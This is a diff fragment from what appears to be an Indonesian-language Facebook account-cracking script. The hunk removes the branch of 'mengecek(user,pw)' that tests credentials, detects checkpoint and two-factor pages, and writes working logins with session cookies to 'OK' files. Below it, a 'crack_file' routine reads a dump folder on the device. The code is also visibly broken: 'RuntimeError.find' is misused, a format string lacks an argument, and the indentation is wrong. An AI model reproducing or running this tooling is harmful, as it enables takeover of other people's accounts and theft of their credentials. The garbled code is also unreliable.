@@ -558,27 +558,6 @@ def mengecek(user,pw):
                 else:
                     print("\r%s%s \033[0m\x1b[1;92mCheckpoint Terbuka, Akun Tap Yes Silahkan Login		"%(H,til))
                     tree = Tree(" ",guide_style=f"{color_ok}")
-                    tree.add(Panel(f"{ua}",width=83,padding=(0,2),style=f"{color_ok}"))
-                    prints(tree)
-                    open('OK/OK-%s.txt' %(day), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
-            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
-                print(Panel("\r%s\033[0m akun terpasang autentikasi dua faktor			"%(M)))
-            else:
-                print("%s%s\033[0mterjadi kesalahan"%(M,til))
-        else:
-            if "c_user" in session.cookies.get_dict():
-                print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
-                open('OK/OK-%s.txt' %(day), 'a').write("%s%s|%s\n" % (H,user,pw))
-            for opsi in range(len(cek)):
-                number +=1
-            jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
-    elif "login_error" in str(response):
-        oh = RuntimeError.find("div",{"id":"login_error"}).find("div").text
-        print("%s %s"%(M,oh))
-    else:
-        tree = Tree(" ",guide_style=f"bold white")
-        tree.add(Panel(f"[bold yellow]login gagal, silahkan cek kembali id dan kata sandi",width=73,padding=(0,2),style=f"bold cyan"))
-        prints(tree)
 
 def crack_file():
 	try:vin = os.listdir('/sdcard/RUDAL-DUMP/')
